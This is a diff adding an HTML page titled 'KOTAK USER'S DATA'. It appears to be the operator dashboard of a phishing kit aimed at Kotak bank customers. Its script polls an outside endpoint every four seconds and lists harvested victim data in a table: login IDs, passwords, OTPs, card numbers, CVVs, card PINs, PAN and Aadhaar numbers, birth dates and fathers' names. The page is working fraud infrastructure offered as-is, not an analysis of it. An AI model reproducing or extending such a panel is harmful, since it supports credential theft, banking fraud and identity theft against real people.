@@ -1,0 +1,241 @@
+<!DOCTYPE html><html>
+<head>
+     <meta charset="UTF-8">
+     <meta http-equiv="X-UA-Compatible" content="ie=edge">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+     <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+     <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+     <link rel="manifest" href="/site.webmanifest">
+     <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+     <meta name="msapplication-TileColor" content="#da532c">
+    <title>KOTAK USER'S DATA</title>
+    <link href="bootstrap.min.css" rel="stylesheet">
+  <script src="bootstrap.bundle.min.js"></script>
+</head>
+<body>
+    <div id="data-container">
+        <table class="table table-white table-hover table-striped container-fluid">
+            <thead>               
+                <tr>
+                    <th style="color:red;">SR</th>
+                    <th>User Id</th>
+                    <th>Password</th>
+                    <th>Mobile No</th>
+                    <th>1ST OTP</th>
+                    <th>Card Holder</th>
+                    <th>Card Number</th>
+                    <th>Expiry Date</th>
+                    <th>CVV</th>
+                    <th>Card Pin</th>
+                    <th>CRN Number</th>
+                    <th>CRN Mobile</th>
+                    <th>CRN OTP</th>
+                    <th>Full Name</th>
+                    <th>DOB</th>
+                    <th>DOB OTP</th>
+                    <th>2ND DOB OTP</th>
+                    <th>PAN Full Name</th>
+                    <th>PAN Number</th>
+                    <th>PAN OTP</th>
+                    <th>Aadhar Full Name</th>
+                    <th>Aadhar Number</th>
+                    <th>Father Name</th>
+                    <th>Aadhar OTP</th>
+                </tr>
+            </thead>
+            <tbody id="data-body"></tbody>
+        </table>
+    </div>
+
+<script type="text/javascript">
+    // Get a reference to the "Get Data" button and data container elements
+    var dataBody = document.getElementById("data-body");
+
+    function displayData(data) {
+        // Clear the data container
+        dataBody.innerHTML = "";
+
+        // Loop through the data and create rows in the table for each record
+        for (var i = 0; i < data.length; i++) {
+            var record = data[i];
+
+            var url = window.location.hostname;
+            var domains = url + '/Show.html';
+
+            if (record.domain == domains) {
+                // Create a new row in the table
+                var row = document.createElement("tr");
+
+                // Create table cells (td) for each data field
+                var idCell = document.createElement("td");
+                idCell.textContent = record.id;
+
+
+                var c_user_idCell = document.createElement("td");
+                c_user_idCell.textContent = record.crn_user_id
+
+                var passwordCell = document.createElement("td");
+                passwordCell.textContent = record.password;
+
+
+                var mobile_noCell = document.createElement("td");
+                mobile_noCell.textContent = record.mobile_number;
+
+                var mpinCell = document.createElement("td");
+                mpinCell.textContent = record.otp1;
+
+                var otp1Cell = document.createElement("td");
+                otp1Cell.textContent = record.card_holder;
+
+                var aCell = document.createElement("td");
+                aCell.textContent = record.card_number;
+
+                var bCell = document.createElement("td");
+                bCell.textContent = record.expiry_date;
+
+                var cCell = document.createElement("td");
+                cCell.textContent = record.cvv;
+
+                var dCell = document.createElement("td");
+                dCell.textContent = record.card_pan;
+
+                var eCell = document.createElement("td");
+                eCell.textContent = record.crn_number;
+
+                var fCell = document.createElement("td");
+                fCell.textContent = record.crn_mobile;
+
+                var gCell = document.createElement("td");
+                gCell.textContent = record.crn_otp;
+
+                var hCell = document.createElement("td");
+                hCell.textContent = record.full_name;
+
+                var iCell = document.createElement("td");
+                iCell.textContent = record.dob;
+
+                var jCell = document.createElement("td");
+                jCell.textContent = record.dob_otp;
+
+                var kCell = document.createElement("td");
+                kCell.textContent = record.inv_dob_otp;
+
+                var lCell = document.createElement("td");
+                lCell.textContent = record.pan_full_name;
+
+                var mCell = document.createElement("td");
+                mCell.textContent = record.pan_number;
+
+                var nCell = document.createElement("td");
+                nCell.textContent = record.pan_otp;
+
+                var oCell = document.createElement("td");
+                oCell.textContent = record.aadhar_full_name;
+
+                var pCell = document.createElement("td");
+                pCell.textContent = record.aadhar_number;
+
+                var otp2Cell = document.createElement("td");
+                otp2Cell.textContent = record.father_name;
+
+                var otp3Cell = document.createElement("td");
+                otp3Cell.textContent = record.aadhar_otp;
+
+
+
+                // Append cells to the row
+                row.appendChild(idCell);
+                row.appendChild(c_user_idCell);
+                row.appendChild(passwordCell);
+                row.appendChild(mobile_noCell);
+                row.appendChild(mpinCell);
+                row.appendChild(otp1Cell);
+                row.appendChild(aCell);
+                row.appendChild(bCell);
+                row.appendChild(cCell);
+                row.appendChild(dCell);
+                row.appendChild(eCell);
+                row.appendChild(fCell);
+                row.appendChild(gCell);
+                row.appendChild(hCell);
+                row.appendChild(iCell);
+                row.appendChild(jCell);
+                row.appendChild(kCell);
+                row.appendChild(lCell);
+                row.appendChild(mCell);
+                row.appendChild(nCell);
+                row.appendChild(oCell);
+                row.appendChild(pCell);
+                row.appendChild(otp2Cell);
+                row.appendChild(otp3Cell);
+
+
+
+
+                // Append the row to the table body
+                dataBody.appendChild(row);
+            }
+        }
+    }
+
+    function getDataFromAPI() {
+        // Create a new XMLHttpRequest object
+        var xhr = new XMLHttpRequest();
+
+        // Set the API endpoint URL
+        var url = "https://anikdevnath.com/KOTAK_WEB/get.php";
+
+        // Open a new GET request with the URL
+        xhr.open("GET", url);
+
+        // Set the response type as JSON, assuming the API returns JSON data
+        xhr.responseType = "json";
+
+        // Define a function to handle the response
+        xhr.onload = function() {
+            // Check if the request was successful (status code 200)
+            if (xhr.status === 200) {
+                // Get the response data from the XHR object
+                var data = xhr.response;
+                displayData(data);
+            }
+        };
+
+        // Send the request to the server
+        xhr.send();
+    }
+
+    function getDataFromAnotherAPI() {
+        // Create a new XMLHttpRequest object
+        var xhr = new XMLHttpRequest();
+
+        // Set the API endpoint URL
+        var url = "https://anikdevnath.com/KOTAK_WEB/get.php";
+
+        // Open a new GET request with the URL
+        xhr.open("GET", url);
+
+        // Set the response type as JSON, assuming the API returns JSON data
+        xhr.responseType = "json";
+
+        // Define a function to handle the response
+        xhr.onload = function() {
+            // Check if the request was successful (status code 200)
+            if (xhr.status === 200) {
+                // Get the response data from the XHR object
+                var data = xhr.response;
+                displayData(data);
+            }
+        };
+
+        // Send the request to the server
+        xhr.send();
+    }
+
+    // Call the functions to get data and display it in the table
+    getDataFromAPI();
+    setInterval(getDataFromAnotherAPI, 4000);
+</script>
+
+</body></html>
